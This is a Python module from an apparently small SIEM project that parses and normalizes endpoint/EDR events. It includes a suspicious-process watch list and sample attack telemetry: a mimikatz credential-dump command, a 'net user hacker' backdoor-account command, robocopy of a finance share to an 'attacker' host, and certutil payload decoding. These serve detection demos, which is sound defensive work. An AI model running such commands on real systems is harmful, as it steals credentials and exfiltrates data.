"""
mini-siem.app.logs.endpoint
~~~~~~~~~~~~~~~~~~~~~~~~~~~
Ingest and normalize endpoint/EDR telemetry.

Accepts JSON objects (one per line or as a list) in a generic EDR format
compatible with CrowdStrike, Carbon Black, SentinelOne, and Elastic
Endpoint export schemas.

Example input (single JSON object)::

    {
      "timestamp": "2025-06-15T09:05:33Z",
      "hostname": "WS-PC14",
      "username": "jdoe",
      "process_name": "powershell.exe",
      "parent_process": "cmd.exe",
      "command_line": "powershell.exe -EncodedCommand ...",
      "event_type": "ProcessCreate",
      "severity": "high",
      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    }

Normalized fields
-----------------
event_type  Canonical type mapped from EDR event categories
severity    Derived from raw severity or process heuristics
host        hostname from record
user        username from record
process     process_name
message     Human-readable summary
metadata    command_line, parent_process, file_path, md5, sha256
"""

import json
import logging
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

from app.database import insert_raw_log, insert_normalized_event

logger = logging.getLogger("mini-siem.endpoint")

_EVENT_TYPE_MAP = {
    "ProcessCreate":         "process_created",
    "ProcessTerminate":      "process_terminated",
    "FileCreate":            "file_created",
    "FileModify":            "file_modified",
    "FileDelete":            "file_deleted",
    "NetworkConnect":        "network_connection",
    "RegistrySet":           "registry_modified",
    "DnsQuery":              "dns_query",
    "ImageLoad":             "image_loaded",
    "CreateRemoteThread":    "remote_thread",
    "ProcessAccess":         "process_access",
    "UserLogon":             "login_success",
    "UserLogoff":            "logoff",
    "UserLogonFailed":       "login_failure",
    "PrivilegeUse":          "privilege_assigned",
    "DefenseEvasion":        "defense_evasion",
    "LateralMovement":       "lateral_movement",
}

# Process names that should bump severity to high
_SUSPICIOUS_PROCS = {
    "powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe",
    "mshta.exe", "regsvr32.exe", "rundll32.exe", "certutil.exe",
    "bitsadmin.exe", "psexec.exe", "mimikatz.exe", "net.exe",
}


def _map_severity(raw: str, process_name: str) -> str:
    raw_lower = (raw or "").lower()
    if raw_lower in ("critical", "high"):
        return raw_lower
    if raw_lower == "medium":
        return "medium"
    if process_name.lower() in _SUSPICIOUS_PROCS:
        return "high"
    return "low"


def parse_endpoint_event(obj: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """Parse a single EDR event dict into a normalized event."""
    raw_ts = obj.get("timestamp") or obj.get("time") or obj.get("event_time", "")
    try:
        timestamp = datetime.fromisoformat(
            str(raw_ts).replace("Z", "+00:00")
        ).isoformat()
    except (ValueError, AttributeError):
        timestamp = datetime.now(timezone.utc).isoformat()

    host = obj.get("hostname") or obj.get("host") or obj.get("computer_name", "unknown")
    user = obj.get("username") or obj.get("user") or obj.get("subject_user", "")
    process = obj.get("process_name") or obj.get("image") or obj.get("process", "")
    cmd_line = obj.get("command_line") or obj.get("cmd", "")
    parent = obj.get("parent_process") or obj.get("parent_image", "")
    file_path = obj.get("file_path") or obj.get("target_filename", "")
    md5 = obj.get("md5") or obj.get("hash_md5", "")
    sha256 = obj.get("sha256") or obj.get("hash_sha256", "")
    raw_type = obj.get("event_type") or obj.get("EventType", "ProcessCreate")
    raw_sev = obj.get("severity") or obj.get("Severity", "")

    event_type = _EVENT_TYPE_MAP.get(raw_type, f"endpoint_{raw_type.lower()}")
    severity = _map_severity(raw_sev, process)

    msg_parts = [f"EventType={raw_type}", f"Process={process}"]
    if user:
        msg_parts.append(f"User={user}")
    if cmd_line:
        msg_parts.append(f"Cmd={cmd_line[:120]}")
    if parent:
        msg_parts.append(f"Parent={parent}")

    return {
        "timestamp": timestamp,
        "source": "endpoint",
        "event_type": event_type,
        "severity": severity,
        "host": host,
        "user": user,
        "process": process,
        "message": " | ".join(msg_parts),
        "metadata_json": json.dumps({
            "command_line": cmd_line,
            "parent_process": parent,
            "file_path": file_path,
            "md5": md5,
            "sha256": sha256,
            "raw_event_type": raw_type,
        }),
    }


def ingest_endpoint_events(
    data: Any, db_path: Optional[str] = None
) -> List[int]:
    """Ingest endpoint events from a list of dicts or newline-delimited JSON string."""
    if isinstance(data, str):
        records = []
        for line in data.splitlines():
            line = line.strip()
            if line:
                try:
                    records.append(json.loads(line))
                except json.JSONDecodeError:
                    logger.warning("Skipping invalid endpoint JSON line")
    elif isinstance(data, list):
        records = data
    else:
        records = [data]

    event_ids: List[int] = []
    for rec in records:
        raw_text = json.dumps(rec)
        raw_id = insert_raw_log("endpoint", raw_text, db_path=db_path)
        parsed = parse_endpoint_event(rec)
        if parsed is None:
            continue
        parsed["raw_log_id"] = raw_id
        eid = insert_normalized_event(parsed, db_path=db_path)
        event_ids.append(eid)

    logger.info("Ingested %d endpoint events", len(event_ids))
    return event_ids


# ──────────────────────────────────────────────
# Sample data
# ──────────────────────────────────────────────

_SAMPLE_EVENTS = [
    {
        "timestamp": "2025-06-15T09:05:33Z",
        "hostname": "WS-PC14",
        "username": "jdoe",
        "process_name": "powershell.exe",
        "parent_process": "cmd.exe",
        "command_line": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdA...",
        "event_type": "ProcessCreate",
        "severity": "high",
    },
    {
        "timestamp": "2025-06-15T09:06:01Z",
        "hostname": "WS-PC14",
        "username": "jdoe",
        "process_name": "mimikatz.exe",
        "parent_process": "powershell.exe",
        "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
        "event_type": "ProcessCreate",
        "severity": "critical",
        "md5": "3e4b9a0c1234abcd5678ef90",
    },
    {
        "timestamp": "2025-06-15T09:07:15Z",
        "hostname": "WS-PC14",
        "username": "jdoe",
        "process_name": "net.exe",
        "parent_process": "cmd.exe",
        "command_line": "net user hacker P@ssw0rd /add",
        "event_type": "ProcessCreate",
        "severity": "high",
    },
    {
        "timestamp": "2025-06-15T09:10:00Z",
        "hostname": "SRV-FILE01",
        "username": "svc_backup",
        "process_name": "robocopy.exe",
        "parent_process": "services.exe",
        "command_line": "robocopy C:\\Shares\\Finance \\\\attacker\\share /E",
        "event_type": "NetworkConnect",
        "severity": "high",
    },
    {
        "timestamp": "2025-06-15T09:15:00Z",
        "hostname": "WS-PC22",
        "username": "msmith",
        "process_name": "chrome.exe",
        "parent_process": "explorer.exe",
        "command_line": "chrome.exe --url https://internal-hr.corp.local",
        "event_type": "ProcessCreate",
        "severity": "low",
    },
    {
        "timestamp": "2025-06-15T09:20:00Z",
        "hostname": "DC01",
        "username": "SYSTEM",
        "process_name": "lsass.exe",
        "parent_process": "wininit.exe",
        "command_line": "",
        "event_type": "ProcessAccess",
        "severity": "critical",
        "md5": "deadbeef00001111",
    },
    {
        "timestamp": "2025-06-15T09:25:30Z",
        "hostname": "WS-PC14",
        "username": "jdoe",
        "process_name": "certutil.exe",
        "parent_process": "powershell.exe",
        "command_line": "certutil.exe -decode payload.b64 payload.exe",
        "event_type": "ProcessCreate",
        "severity": "high",
    },
    {
        "timestamp": "2025-06-15T10:00:00Z",
        "hostname": "WS-PC30",
        "username": "alee",
        "process_name": "outlook.exe",
        "parent_process": "explorer.exe",
        "command_line": "outlook.exe",
        "event_type": "ProcessCreate",
        "severity": "low",
    },
]


def load_sample_data(db_path: Optional[str] = None) -> List[int]:
    """Insert realistic sample endpoint events for demonstration."""
    return ingest_endpoint_events(_SAMPLE_EVENTS, db_path=db_path)
